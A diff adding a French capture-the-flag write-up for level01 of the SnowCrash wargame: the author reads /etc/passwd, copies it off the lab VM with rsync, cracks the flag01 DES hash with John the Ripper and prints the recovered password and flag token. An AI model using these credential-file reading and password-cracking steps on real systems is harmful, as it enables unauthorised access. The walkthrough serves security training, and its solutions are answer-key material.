@@ -1,0 +1,34 @@
+On remarque tout de suite que nous avons les acces en lecture au fichier /etc/passwd, on l'ouvre donc et on remarque cette ligne:
+flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+On vois donc le hash du password de flag01.
+
+Pour le cracker nous allons donc recuperer sur la vm snowcrash le fichier /etc/passwd via rsync:
+rsync -avz -e "ssh -p4242"  level01@192.168.90.128:/etc/passwd ./passwd
+
+Puis nous allons transferer ce fichier sur notre vm linux mint.
+Nous y installons john the ripper qui nous servira a casser le hash du mot de passe,
+sudo apt-get install john
+
+Puis on fait :
+mint@mint ~/Downloads $ ls
+passwd
+mint@mint ~/Downloads $ john passwd
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefg          (flag01)
+1g 0:00:00:00 100% 2/3 100.0g/s 139300p/s 139300c/s 139300C/s raquel..bigman
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+mint@mint ~/Downloads $ john --show passwd
+flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
+
+1 password hash cracked, 0 left
+le mot de passe de flag01 est donc abcdefg
+
+level01@SnowCrash:~$ su flag01
+Password:
+Don't forget to launch getflag !
+flag01@SnowCrash:~$ getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+
+Voila!
